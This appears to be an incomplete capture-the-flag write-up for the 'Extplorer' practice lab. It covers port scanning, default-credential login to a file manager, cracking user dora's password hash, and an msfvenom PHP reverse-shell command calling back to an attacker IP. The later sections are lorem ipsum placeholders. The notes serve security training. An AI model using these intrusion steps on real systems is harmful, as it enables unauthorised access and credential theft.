---
Date: 2024-10-07
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: In progress
IP: 192.168.137.16
Writeup:
---
# Extplorer


# Resolution summary
- Text
- Text
## Improved skills
- skill 1
- skill 2
## Used tools
- nmap
- gobuster

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN extplorer.nmap 192.168.137.16 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.137.16:80` and redirected to `http://192.168.137.16/wp-admin-setup-config.php`
![[Pasted image 20241007200559.png]]
- Clicked "Let's go!" and setup Admin config
![[Pasted image 20241007200736.png]]
- Error message received
![[Pasted image 20241007200814.png]]
- Enumerated web directories with `gobuster` 
![[Pasted image 20241007201438.png]]
- Identified `filemanager` directory & navigated to `http:192.168.137.16/filemanager`
![[Pasted image 20241007201218.png]]
- Password guessed `admin:admin` credentials and logged into Admin panel
![[Pasted image 20241007201309.png]]
- Clicked "OK" and identified `dora` user from new pop-up
![[Pasted image 20241007201413.png]]
- Checked `filemanager/config/.htusers.php` and found `dora` password hash `$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`
![[Pasted image 20241007203309.png]]
- Ran `john` against password hash for `dora` and found credential `dora:doraemon`
![[Pasted image 20241007203751.png]]

---
# Exploitation
## Name of the technique
- Identified option to upload files to Admin dashboard
![[Pasted image 20241007202007.png]]
- Created PHP reverse shell file with MSFVenom: `msfvenom -p php/reverse_php LHOST=192.168.45.160 LPORT=4444 -o shell.php`
- Attempted to navigate to `192.168.137.16/filemanager/shell.php` and caught reverse shell
- ![[Pasted image 20241007225053.png]]
---
# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---
# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Trophy & Loot
`local.txt` = ` `
`root.txt` = ` `